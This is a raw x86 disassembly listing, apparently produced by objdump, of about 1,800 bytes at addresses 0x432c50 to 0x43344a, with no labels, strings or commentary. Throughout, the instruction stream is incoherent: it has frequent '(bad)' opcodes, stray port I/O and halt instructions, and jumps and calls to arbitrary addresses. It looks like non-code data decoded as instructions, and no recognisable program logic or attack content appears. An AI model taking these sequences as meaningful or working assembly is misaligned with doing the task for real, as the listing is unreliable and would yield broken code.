  432c50:	add    al,dh
  432c52:	dec    eax
  432c53:	xchg   esp,eax
  432c54:	push   ebx
  432c55:	jmp    0x432be2
  432c57:	push   ebp
  432c58:	add    esp,ebp
  432c5a:	add    ebp,esp
  432c5c:	mov    edx,DWORD PTR [edi+0x24]
  432c5f:	clc    
  432c60:	dec    esi
  432c61:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432c67:	cmp    BYTE PTR [ebx],al
  432c69:	jne    0x432bf4
  432c6b:	xor    esp,eax
  432c6d:	jmp    0x462df0
  432c72:	add    ebp,DWORD PTR [ecx+ecx*4]
  432c75:	jne    0x432c6b
  432c77:	call   0xffcd29d1
  432c7c:	clc    
  432c7d:	xchg   edi,eax
  432c7e:	sti    
  432c7f:	add    DWORD PTR [ebx],eax
  432c81:	add    BYTE PTR [ebp+0x47],bl
  432c84:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c8a:	pop    ebp
  432c8b:	mov    DWORD PTR [esi-0x48],esi
  432c8e:	jmp    0x432cd7
  432c90:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c96:	(bad)  
  432c98:	cmp    al,0x0
  432c9a:	cmp    eax,DWORD PTR [ebp+0x18]
  432c9d:	lea    ebx,[ebp-0x56]
  432ca0:	jle    0x432ca2
  432ca2:	jae    0x432c2d
  432ca4:	mov    eax,esp
  432ca6:	call   0xb900:0x8b005587
  432cad:	inc    ebp
  432cae:	push   ebp
  432caf:	lea    ecx,[ebp-0x27ff4f12]
  432cb5:	mov    eax,edi
  432cb7:	int3   
  432cb8:	push   ebp
  432cb9:	xchg   edi,eax
  432cbb:	add    esp,ebp
  432cbd:	add    BYTE PTR [eax],al
  432cbf:	inc    ebp
  432cc0:	add    BYTE PTR [ebp+0x8b3255],cl
  432cc6:	cld    
  432cc7:	mov    DWORD PTR [edx],edi
  432cc9:	aam    0x75
  432ccb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432cd1:	mov    DWORD PTR [ebx-0x50],edx
  432cd4:	test   BYTE PTR [ebp-0x1],0xe8
  432cd8:	mov    eax,DWORD PTR [eax]
  432cda:	hlt    
  432cdb:	add    al,al
  432cdd:	mov    eax,DWORD PTR ds:0x890045a8
  432ce3:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432ce9:	inc    DWORD PTR [eax*2+0xf75854d]
  432cf0:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432cf6:	call   0x72998a37
  432cfb:	je     0x432d5b
  432cfd:	js     0x432d5e
  432cff:	lock ret 0x7e
  432d03:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d09:	mov    edi,edi
  432d0b:	sbb    al,bl
  432d0d:	clc    
  432d0e:	add    BYTE PTR [ebp-0x73],bh
  432d11:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d17:	ror    BYTE PTR [eax],1
  432d19:	dec    ebp
  432d1a:	xchg   ebp,eax
  432d1b:	mov    edi,edi
  432d1d:	in     al,0x8b
  432d1f:	jge    0x432caa
  432d21:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d27:	clc    
  432d28:	pop    esi
  432d29:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d2f:	clc    
  432d30:	add    al,0x6e
  432d32:	mov    eax,DWORD PTR [ebx]
  432d34:	mov    BYTE PTR [ebp+0x0],dl
  432d37:	mov    edx,DWORD PTR [ebx-0x20]
  432d3a:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432d40:	add    eax,0x3b3b73
  432d45:	adc    al,0x89
  432d47:	pop    eax
  432d48:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d4c:	ret    0xf08
  432d4f:	cmp    al,0x2
  432d51:	mov    DWORD PTR [edx],edi
  432d53:	cld    
  432d54:	add    BYTE PTR [ebp+0x66],dl
  432d57:	add    eax,ebx
  432d59:	add    esp,eax
  432d5b:	sub    eax,eax
  432d5d:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d63:	add    BYTE PTR [eax],al
  432d65:	mov    DWORD PTR [ebx-0x24],ebx
  432d68:	push   edi
  432d69:	push   ebp
  432d6a:	clc    
  432d6b:	add    DWORD PTR [esi+0x1b0100],0x45
  432d72:	out    0xff,eax
  432d74:	add    edx,DWORD PTR [eax]
  432d76:	jmp    0x432d60
  432d78:	cmp    ch,0x45
  432d7b:	(bad)  
  432d7c:	jmp    0x40c8b5ce
  432d81:	je     0x432d0d
  432d83:	mov    eax,DWORD PTR [eax-0x10c78304]
  432d89:	inc    ebp
  432d8a:	add    BYTE PTR [ebx-0x770375],al
  432d90:	add    ah,ch
  432d92:	add    edx,esp
  432d94:	pop    edi
  432d95:	pop    ebp
  432d96:	push   ebp
  432d97:	inc    ebx
  432d98:	in     al,dx
  432d99:	pop    ebp
  432d9a:	in     al,dx
  432d9b:	cmp    edx,DWORD PTR [edi-0x8]
  432d9e:	xor    eax,0x895b9c94
  432da3:	leave  
  432da4:	call   0x899874ad
  432da9:	in     al,dx
  432daa:	in     al,0x45
  432dac:	dec    ebp
  432dad:	push   esi
  432dae:	test   DWORD PTR [eax+0xfb010f],esi
  432db4:	add    BYTE PTR [eax+0xc018b],dh
  432dba:	leave  
  432dbb:	inc    ebp
  432dbc:	test   al,ch
  432dbe:	add    dh,bh
  432dc0:	add    bh,bh
  432dc2:	dec    ebp
  432dc3:	push   cs
  432dc4:	mov    DWORD PTR [ecx],eax
  432dc6:	hlt    
  432dc7:	push   es
  432dc8:	dec    ebp
  432dc9:	leave  
  432dca:	mov    DWORD PTR [eax],ecx
  432dcc:	clc    
  432dcd:	cmovge eax,ecx
  432dd0:	mov    ecx,0x85c2f0
  432dd6:	clc    
  432dd7:	pop    DWORD PTR [ebp+0x1]
  432dda:	push   ebx
  432ddb:	add    BYTE PTR [ebp-0x15],bh
  432dde:	push   esi
  432ddf:	xor    eax,0x898a45
  432de4:	cld    
  432de5:	add    BYTE PTR [ebp+0x0],al
  432de8:	cmp    esp,DWORD PTR [esi-0x64]
  432deb:	add    DWORD PTR [esi+0x78308c1],edi
  432df1:	add    ah,BYTE PTR [esi-0x49]
  432df4:	int    0xbb
  432df6:	mov    ecx,DWORD PTR [edi+0xc]
  432df9:	add    dh,al
  432dfb:	cmp    ecx,ebx
  432dfd:	jne    0x432dc7
  432dff:	xor    ecx,DWORD PTR [ebp+0x66]
  432e02:	jmp    0xca2e08
  432e07:	add    DWORD PTR [ebp+0x0],eax
  432e0a:	mov    eax,ebx
  432e0c:	or     al,0x8b
  432e0e:	(bad)  
  432e0f:	mov    ecx,esi
  432e11:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432e18:	mov    eax,edi
  432e1a:	or     BYTE PTR [edx],cl
  432e1c:	shl    cl,cl
  432e1e:	icebp  
  432e1f:	add    BYTE PTR [ebp+0x39],0x8b
  432e23:	or     BYTE PTR [edx+eax*2],cl
  432e26:	(bad)  
  432e27:	or     cl,dh
  432e29:	stc    
  432e2a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e2e:	xor    al,0x0
  432e30:	inc    ebp
  432e31:	xchg   BYTE PTR [ebx],al
  432e33:	add    esp,edi
  432e35:	add    BYTE PTR [ebp-0x39],cl
  432e38:	mov    al,bl
  432e3a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e40:	sub    al,0xbf
  432e42:	jmp    0x432dc9
  432e44:	mov    edi,eax
  432e46:	lock jge 0x432e3a
  432e49:	lea    esi,[edx-0x74bad501]
  432e4f:	mov    ebp,esp
  432e51:	or     cl,dh
  432e53:	leave  
  432e54:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432e5b:	dec    ebp
  432e5c:	dec    ebp
  432e5d:	test   DWORD PTR [ebx],eax
  432e5f:	paddb  mm6,mm0
  432e62:	add    DWORD PTR [eax],eax
  432e64:	dec    ebp
  432e65:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432e6b:	mov    esi,DWORD PTR [edx]
  432e6d:	or     al,0x2b
  432e6f:	dec    ebp
  432e70:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432e76:	mov    esp,eax
  432e78:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432e7f:	mov    DWORD PTR [ebx],ebp
  432e81:	call   0xc76b7b1
  432e86:	mov    DWORD PTR [ebp+0x10],ecx
  432e89:	(bad)  
  432e8a:	push   0x8b85ff10
  432e8f:	clc    
  432e90:	or     al,0x53
  432e92:	(bad)  
  432e93:	push   ecx
  432e94:	retf   
  432e95:	mov    ebx,0xff4d8dc8
  432e9a:	mov    DWORD PTR [ebp+0x8],eax
  432e9d:	xor    eax,DWORD PTR [ebp-0x75]
  432ea0:	cmp    ebp,DWORD PTR [ebx]
  432ea2:	lsl    ebx,WORD PTR [edi-0x8]
  432ea6:	call   DWORD PTR [ebx-0x741bff75]
  432eac:	(bad)  
  432ead:	or     al,0x5b
  432eaf:	dec    ebp
  432eb0:	or     BYTE PTR [ebx],dh
  432eb2:	inc    ebp
  432eb3:	xor    esi,DWORD PTR ds:0x708088d
  432eb9:	in     eax,0x9a
  432ebb:	add    BYTE PTR [edx],dh
  432ebd:	inc    ebp
  432ebe:	pop    edi
  432ebf:	xor    eax,edx
  432ec1:	test   DWORD PTR [eax],0x81108b8b
  432ec7:	dec    ebp
  432ec8:	sub    al,0x33
  432eca:	add    BYTE PTR [ebx],dh
  432ecc:	push   esi
  432ecd:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432ed3:	mov    edi,eax
  432ed5:	or     BYTE PTR [ebp+0x45],al
  432ed8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432ede:	xor    eax,0xc7069cc9
  432ee3:	inc    ebp
  432ee4:	cld    
  432ee5:	cmp    DWORD PTR [ebp+0x454df817],eax
  432eeb:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432ef2:	in     al,0x4d
  432ef4:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432efa:	aad    0xe9
  432efc:	xlat   BYTE PTR ds:[ebx]
  432efd:	rol    bh,cl
  432eff:	mov    edx,esp
  432f01:	or     BYTE PTR [ebp+0x4588f84d],al
  432f07:	mov    ecx,DWORD PTR [eax]
  432f09:	or     BYTE PTR [eax],al
  432f0b:	push   ebp
  432f0c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f12:	dec    ebp
  432f13:	enter  0xceba,0x8
  432f17:	retf   0x1807
  432f1a:	ret    0x9a4d
  432f1d:	mov    esi,DWORD PTR [edx]
  432f1f:	or     al,0x33
  432f21:	into   
  432f22:	add    edx,esi
  432f24:	add    ecx,edx
  432f26:	bswap  eax
  432f28:	ror    esi,0x98
  432f2b:	dec    ebp
  432f2c:	add    cl,ch
  432f2e:	mov    edi,edi
  432f30:	hlt    
  432f31:	inc    esi
  432f33:	inc    ebp
  432f34:	ret    0x4533
  432f37:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f3d:	or     BYTE PTR [ebx],dh
  432f3f:	dec    ebp
  432f40:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f46:	jne    0xff8d2f0d
  432f4c:	inc    ebp
  432f4d:	inc    ebp
  432f4e:	mov    esi,DWORD PTR [ebx]
  432f50:	clc    
  432f51:	pop    esi
  432f52:	ret    0xcaeb
  432f55:	mov    eax,esi
  432f57:	call   0x5204832a
  432f5c:	dec    ebp
  432f5d:	add    eax,0xf8728b
  432f62:	adc    eax,0xce0ccac9
  432f67:	push   ebp
  432f68:	ret    0xc6ec
  432f6b:	in     al,dx
  432f6c:	call   0x33437c75
  432f71:	push   edi
  432f72:	add    edi,eax
  432f74:	xor    eax,eax
  432f76:	jmp    0x432fbd
  432f78:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432f7e:	add    eax,edi
  432f80:	shr    eax,cl
  432f82:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f88:	mov    esi,DWORD PTR [esp+ebp*8]
  432f8b:	pushf  
  432f8c:	ret    0x84c7
  432f8f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432f95:	inc    ebp
  432f96:	in     al,dx
  432f97:	xor    eax,0xc78b9c45
  432f9c:	cld    
  432f9d:	fmul   st(2),st
  432f9f:	sbb    dl,al
  432fa1:	jmp    0x9c3b:0x364d45c1
  432fa8:	jbe    0x432f71
  432faa:	mov    esp,eax
  432fac:	clc    
  432fad:	add    BYTE PTR [ebp+0x0],cl
  432fb0:	mov    ecx,ecx
  432fb2:	lea    eax,[ebp-0x5]
  432fb5:	mov    edi,edi
  432fb7:	call   0x51ce8301
  432fbc:	hlt    
  432fbd:	xor    eax,edx
  432fbf:	mov    esi,0x9a7284
  432fc4:	xor    cl,dl
  432fc6:	mov    esi,eax
  432fc8:	hlt    
  432fc9:	into   
  432fca:	inc    ebp
  432fcb:	scas   eax,DWORD PTR es:[edi]
  432fcc:	mov    ebp,ecx
  432fce:	cld    
  432fcf:	add    dl,cl
  432fd1:	add    dl,al
  432fd3:	inc    ebp
  432fd4:	shr    DWORD PTR [ebx],0x4d
  432fd7:	xor    edi,DWORD PTR [ebx]
  432fd9:	mov    DWORD PTR [edi],ecx
  432fdb:	clc    
  432fdc:	dec    esi
  432fdd:	inc    ebp
  432fde:	dec    DWORD PTR [ebx-0x3d2b1775]
  432fe4:	ret    0xc6ca
  432fe7:	mov    BYTE PTR [ebp-0x32],0x53
  432feb:	scas   eax,DWORD PTR es:[edi]
  432fec:	inc    ebp
  432fed:	jmp    0x433025
  432fef:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432ff6:	pop    ebx
  432ff7:	xor    ecx,DWORD PTR [ebp+0x3]
  432ffa:	mov    eax,DWORD PTR [ebx]
  432ffc:	clc    
  432ffd:	test   edx,ecx
  432fff:	mov    ecx,esi
  433001:	cld    
  433002:	call   0x8ab7754c
  433007:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43300d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433013:	fdiv   QWORD PTR [ebx]
  433015:	retf   0xce89
  433018:	in     al,0xc1
  43301a:	inc    ebp
  43301b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433021:	into   
  433022:	mov    dh,0xc1
  433025:	call   0x8c1775ae
  43302a:	(bad)  
  43302b:	cld    
  43302c:	mov    ecx,DWORD PTR [ebp-0x14]
  43302f:	xor    eax,ecx
  433031:	lea    eax,[ebp+0x8]
  433034:	mov    esi,DWORD PTR [edx-0x4]
  433037:	add    dl,al
  433039:	inc    ebp
  43303a:	mov    esp,0x32d89a8b
  43303f:	dec    ebp
  433040:	mov    esi,DWORD PTR [ebx]
  433042:	cld    
  433043:	xor    eax,edx
  433045:	sub    esp,DWORD PTR [esi-0x75]
  433048:	int    0xec
  43304a:	sub    ecx,eax
  43304c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433052:	mov    esi,esp
  433054:	call   0x34177ddd
  433059:	inc    DWORD PTR [ebx]
  43305b:	mov    edi,DWORD PTR [ebx]
  43305d:	cld    
  43305e:	jne    0x4330ad
  433060:	mov    esi,DWORD PTR [ebx]
  433062:	aam    0x8d
  433064:	dec    ebp
  433065:	or     BYTE PTR [ebx],dh
  433067:	jb     0x43306c
  433069:	add    BYTE PTR [edi+0x45],bl
  43306c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433073:	xor    ebp,esp
  433075:	xor    eax,edi
  433077:	sub    edi,esp
  433079:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  43307f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433086:	inc    ebp
  433087:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43308d:	clc    
  43308e:	mov    eax,edi
  433090:	nop
  433091:	fadd   QWORD PTR [eax]
  433093:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433099:	jmp    0x433024
  43309b:	mov    eax,DWORD PTR [ecx]
  43309d:	fadd   DWORD PTR [eax]
  43309f:	inc    ebp
  4330a0:	or     DWORD PTR [ebx],esi
  4330a2:	dec    eax
  4330a3:	add    edx,DWORD PTR [ebx-0x2d]
  4330a6:	dec    ebp
  4330a7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330ad:	inc    ebp
  4330ae:	push   ebx
  4330af:	mov    dl,BYTE PTR [ecx-0xd]
  4330b2:	xor    ecx,DWORD PTR [ebp-0x45]
  4330b5:	(bad)  
  4330b7:	rol    BYTE PTR [eax],0xc1
  4330ba:	ret    
  4330bb:	inc    ebp
  4330bc:	inc    ebp
  4330bd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330c3:	xor    eax,ebx
  4330c5:	add    eax,DWORD PTR [ebp+0x23]
  4330c8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  4330ce:	cmp    edi,0xc
  4330d1:	dec    ebp
  4330d2:	inc    ebp
  4330d3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  4330d9:	inc    ebp
  4330da:	mov    esi,DWORD PTR [ebx]
  4330dc:	clc    
  4330dd:	lea    eax,[ebp+0x45725407]
  4330e3:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4330e7:	xor    edi,DWORD PTR [eax]
  4330e9:	mov    ecx,0xff8b8d4d
  4330ee:	push   esp
  4330ef:	enter  0x4df7,0x23
  4330f3:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4330f9:	mov    eax,DWORD PTR [ebx]
  4330fb:	loopne 0x4330e8
  4330fd:	ret    0xc68b
  433100:	push   esp
  433101:	enter  0x9745,0x8b
  433105:	inc    ebp
  433106:	cld    
  433107:	mov    eax,edi
  433109:	clc    
  43310a:	ret    
  43310b:	ret    0xc645
  43310e:	mov    esi,DWORD PTR [ebx]
  433110:	cld    
  433111:	pop    esi
  433112:	mov    ebx,0x83458bc3
  433118:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43311c:	dec    ebp
  43311d:	xor    eax,0xba039c33
  433122:	mov    DWORD PTR [ebp+0x55d8f889],eax
  433128:	inc    ebp
  433129:	mov    edi,DWORD PTR [ebx]
  43312b:	adc    al,0x9c
  43312d:	inc    ebp
  43312e:	(bad)  
  43312f:	mov    ebx,eax
  433131:	adc    al,0x85
  433133:	cmp    al,0x1
  433136:	inc    ebp
  433137:	add    BYTE PTR [ecx],bh
  433139:	dec    ebp
  43313a:	pushf  
  43313b:	mov    ebp,ecx
  43313d:	mov    eax,DWORD PTR [ebx]
  43313f:	nop
  433140:	add    BYTE PTR [eax],al
  433142:	inc    ebp
  433143:	mov    esi,DWORD PTR [ebx]
  433145:	add    eax,DWORD PTR [ebx]
  433147:	cmp    al,0x89
  433149:	mov    esp,esi
  43314b:	clc    
  43314c:	inc    ebp
  43314d:	inc    ebp
  43314e:	add    edx,DWORD PTR [esi+0xc]
  433151:	mov    edi,0x7ff0845
  433156:	in     al,dx
  433157:	(bad)  
  433158:	jne    0x4330f4
  43315a:	mov    esi,DWORD PTR [edx]
  43315c:	clc    
  43315d:	add    ebp,DWORD PTR [esi]
  43315f:	mov    edi,edi
  433161:	in     al,dx
  433162:	mov    DWORD PTR [ebp-0x10],eax
  433165:	xor    eax,DWORD PTR [ebp+0x3]
  433168:	cmp    eax,0x8bf49c89
  43316d:	inc    ebp
  43316e:	fmul   DWORD PTR [ebx-0x173caf39]
  433174:	lea    ecx,[ecx+0x45e8d4bc]
  43317a:	clc    
  43317b:	mov    edi,edi
  43317d:	cmp    BYTE PTR [ebp+0x4d],al
  433180:	test   DWORD PTR [eax+0x74],ecx
  433183:	inc    ecx
  433184:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43318a:	ret    
  43318b:	inc    eax
  43318c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433192:	push   eax
  433193:	dec    eax
  433194:	test   al,0xd0
  433196:	dec    eax
  433198:	mov    eax,DWORD PTR [ebp-0x14]
  43319b:	mov    eax,DWORD PTR [ebp+0x38]
  43319e:	mov    eax,ecx
  4331a0:	fadd   DWORD PTR [ebx]
  4331a2:	dec    ebp
  4331a3:	inc    eax
  4331a4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331aa:	inc    ebp
  4331ab:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331b1:	fadd   QWORD PTR [ebx]
  4331b3:	inc    ebp
  4331b4:	or     al,0x33
  4331b6:	dec    ebp
  4331b7:	add    edi,DWORD PTR [ebx]
  4331b9:	mov    DWORD PTR [edx-0x28],esi
  4331bc:	mov    eax,DWORD PTR [ebp-0x10]
  4331bf:	mov    eax,DWORD PTR [eax+0x10]
  4331c2:	mov    eax,edi
  4331c4:	lock ret 
  4331c6:	inc    ecx
  4331c7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  4331cd:	fsubr  st,st(5)
  4331cf:	test   DWORD PTR [eax],eax
  4331d1:	clc    
  4331d2:	push   0x45
  4331d4:	(bad)  
  4331d5:	cmp    ch,ah
  4331d7:	pushf  
  4331d8:	inc    ebp
  4331d9:	(bad)  
  4331da:	push   eax
  4331db:	fsub   DWORD PTR [eax-0x7b]
  4331de:	(bad)  
  4331df:	clc    
  4331e0:	mov    eax,0xf8008584
  4331e5:	mov    eax,DWORD PTR [ebp-0x4]
  4331e8:	mov    edi,0x4585c3cc
  4331ee:	clc    
  4331ef:	mov    eax,DWORD PTR [ebp+0x14]
  4331f2:	cmp    eax,DWORD PTR [ebp-0x64]
  4331f5:	mov    edi,eax
  4331f7:	in     al,dx
  4331f8:	les    esi,FWORD PTR [ebp-0x7b]
  4331fb:	mov    edi,eax
  4331fd:	or     al,0x4d
  4331ff:	dec    ebp
  433200:	mov    eax,ebp
  433202:	in     al,0xf2
  433204:	dec    ebp
  433205:	dec    DWORD PTR [ecx+0x4dc7e045]
  43320b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433211:	inc    ebp
  433212:	mov    DWORD PTR [ebx],esi
  433214:	fadd   QWORD PTR [ebx]
  433216:	dec    ebp
  433217:	push   eax
  433218:	xor    eax,DWORD PTR [ebp+0x3]
  43321b:	push   eax
  43321c:	mov    DWORD PTR [eax+ebx*8],ebx
  43321f:	push   esi
  433221:	mov    eax,DWORD PTR [eax]
  433223:	lock cmp eax,0xf84e85c0
  433229:	inc    ebp
  43322a:	test   BYTE PTR [ebx],dh
  43322c:	add    DWORD PTR [ebx],eax
  43322e:	add    BYTE PTR [eax+0x4d],dl
  433231:	jne    0x433266
  433233:	lea    ecx,[ebx-0x7617fc44]
  433239:	div    ah
  43323b:	inc    DWORD PTR [ebp+0x45]
  43323e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433244:	jb     0x4331d1
  433246:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43324d:	mov    ecx,DWORD PTR [ebp-0x10]
  433250:	xor    ecx,DWORD PTR [ebp+0x3]
  433253:	mov    edi,DWORD PTR [ebx]
  433255:	adc    BYTE PTR [ebp+0x41],dh
  433258:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43325e:	ret    
  43325f:	push   ss
  433260:	push   0x45
  433262:	lea    ecx,[ebx+0x4de80cb0]
  433268:	sti    
  433269:	add    edi,edi
  43326b:	or     BYTE PTR [ebp+0x4d],al
  43326e:	mov    ebp,DWORD PTR [ebx]
  433270:	xor    ebp,ecx
  433272:	mov    al,BYTE PTR [edx]
  433274:	add    eax,0xc7200
  433279:	jne    0x4332c8
  43327b:	lea    esi,[ebx]
  43327d:	mov    al,0xf
  43327f:	call   0xf2944
  433284:	shl    DWORD PTR ds:0x89019c84,0x0
  43328b:	rol    BYTE PTR [ebp+0x45],1
  43328e:	mov    esi,DWORD PTR [ebx+esi*1]
  433291:	pushf  
  433292:	mov    al,bh
  433294:	add    eax,0x8572c8
  433299:	clc    
  43329a:	dec    ebp
  43329b:	inc    ebp
  43329c:	xor    edi,DWORD PTR [edx]
  43329e:	setl   al
  4332a1:	(bad)  
  4332a2:	retf   
  4332a3:	rol    cl,1
  4332a5:	dec    ebp
  4332a6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4332ac:	inc    ebp
  4332ad:	lea    ecx,[ebx-0x75b2cc38]
  4332b3:	lea    eax,ds:0x4d72c4
  4332b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4332bc:	xor    ecx,edi
  4332be:	bswap  ebx
  4332c0:	ror    BYTE PTR [ebp-0x35],0xe9
  4332c4:	rol    DWORD PTR [ecx],0x84
  4332c7:	add    BYTE PTR [ecx],al
  4332c9:	cmp    eax,DWORD PTR [eax]
  4332cb:	pushf  
  4332cc:	inc    ebp
  4332cd:	jnp    0x8a4366d0
  4332d3:	mov    eax,DWORD PTR ds:0xcf72e8
  4332d9:	lock dec ebp
  4332db:	retf   
  4332dc:	xor    ecx,DWORD PTR [ebp+0xf]
  4332df:	mov    eax,eax
  4332e1:	fmul   st,st(3)
  4332e3:	test   ecx,0x19a8484
  4332e9:	xor    al,BYTE PTR [eax]
  4332eb:	mov    DWORD PTR [ebp-0x28],eax
  4332ee:	mov    eax,DWORD PTR [ebp+0x33]
  4332f1:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4332f7:	ret    
  4332f8:	add    al,cl
  4332fa:	dec    ebp
  4332fb:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433301:	add    ecx,DWORD PTR ds:0xc7250
  433307:	inc    ebp
  433308:	rcl    DWORD PTR [eax+0x4d],0x2b
  43330c:	mov    edi,edi
  43330e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433314:	jb     0x4332dd
  433316:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43331d:	mov    esi,DWORD PTR [ebx]
  43331f:	cld    
  433320:	mov    cl,bh
  433322:	or     eax,0x372b6
  433327:	cmp    ecx,eax
  433329:	jne    0x4333a6
  43332f:	mov    eax,DWORD PTR [ebp-0x20]
  433332:	mov    eax,DWORD PTR [eax]
  433334:	xor    eax,edi
  433336:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  43333d:	mov    ecx,DWORD PTR [ebp-0x4]
  433340:	mov    ecx,edi
  433342:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433348:	jb     0x433359
  43334a:	add    BYTE PTR [edi-0x3f],dl
  43334d:	add    BYTE PTR [ebp-0x75],cl
  433350:	mov    esi,eax
  433352:	xor    eax,DWORD PTR [eax]
  433354:	mov    al,bh
  433356:	or     eax,0x4a7284
  43335b:	xor    al,cl
  43335d:	mov    ecx,DWORD PTR [ebp-0x4]
  433360:	mov    ecx,edi
  433362:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433368:	jb     0x433379
  43336a:	add    BYTE PTR [edi],dh
  43336c:	enter  0x8500,0x8b
  433370:	add    ah,bl
  433372:	add    BYTE PTR [eax],al
  433374:	inc    ebp
  433375:	(bad)  
  433376:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  43337d:	mov    esi,DWORD PTR [edx-0x4]
  433380:	add    bh,cl
  433382:	dec    ebp
  433383:	mov    dh,0x8b
  433385:	add    esi,DWORD PTR [ebx]
  433387:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43338d:	add    BYTE PTR [eax],al
  43338f:	mov    eax,ecx
  433391:	loopne 0x4333e0
  433393:	add    BYTE PTR [ebx-0x757bcc39],cl
  433399:	dec    edx
  43339a:	or     eax,0x8b7232
  43339f:	in     al,0xc1
  4333a1:	or     DWORD PTR [ebp-0x31],ecx
  4333a4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  4333ab:	xor    dh,BYTE PTR [edx-0x75]
  4333ae:	add    al,dh
  4333b0:	enter  0x4f09,0xcf
  4333b4:	inc    ebp
  4333b5:	mov    WORD PTR [ebx-0x75cdccb6],cs
  4333bb:	or     al,BYTE PTR ds:0xe4728b
  4333c1:	or     DWORD PTR [ebp-0x31],ecx
  4333c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  4333cb:	cmp    dh,BYTE PTR [edx+0xf]
  4333ce:	add    bl,dl
  4333d0:	rol    DWORD PTR [eax],0x4d
  4333d3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4333d9:	(bad)  
  4333da:	or     eax,0x4a7284
  4333df:	xor    al,cl
  4333e1:	mov    ecx,DWORD PTR [ebp-0x20]
  4333e4:	mov    ecx,DWORD PTR [ecx]
  4333e6:	xor    ecx,edi
  4333e8:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  4333ef:	xor    cl,al
  4333f1:	mov    ecx,DWORD PTR [edi]
  4333f3:	fadd   QWORD PTR [ebp+0x9]
  4333f6:	call   0xffd02eca
  4333fb:	dec    edx
  4333fc:	dec    ebp
  4333fd:	xor    bh,BYTE PTR [ebx]
  4333ff:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433403:	loopne 0x433401
  433405:	or     edi,eax
  433407:	iret   
  433408:	ret    
  433409:	mov    WORD PTR [ebp+0x4e],es
  43340c:	mov    esi,DWORD PTR [edx]
  43340e:	call   0x8452fb4d
  433413:	(bad)  
  433414:	call   0x8bdc:0x338b3200
  43341b:	add    ah,bh
  43341d:	(bad)  
  43341e:	push   ebp
  43341f:	test   BYTE PTR [ebx],dh
  433421:	dec    edx
  433422:	add    esi,DWORD PTR [edx]
  433424:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43342a:	dec    edi
  43342c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  433433:	xor    al,BYTE PTR [ebx]
  433435:	mov    edi,DWORD PTR [ebx]
  433437:	in     al,0x75
  433439:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43343f:	dec    edx
  433440:	xor    esi,DWORD PTR [edx]
  433442:	lea    ecx,[edx]
  433444:	or     BYTE PTR [ebx+0x900f072],cl
  43344a:	ja     0x43341b
